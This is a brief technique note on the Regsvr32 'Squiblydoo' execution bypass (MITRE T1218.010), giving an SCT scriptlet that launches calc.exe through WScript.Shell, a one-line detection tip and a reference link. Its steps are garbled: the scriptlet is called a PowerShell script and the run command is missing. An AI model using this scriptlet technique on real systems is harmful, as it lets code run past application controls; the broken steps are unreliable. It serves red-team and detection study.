# [Regsvr32](https://attack.mitre.org/techniques/T1218/010/)

## Exploit syntax:
1. Create a powershell script and save it to /tmp/mr..txt
``
<?XML version="1.0"?>
<scriptlet>
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
    ]]>
</script>
</registration>
</scriptlet>
2. In posh run:
    ```

## Detection Technique:
* Monitor regsvr32.exe for malicious code execution.

## Resource
* https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo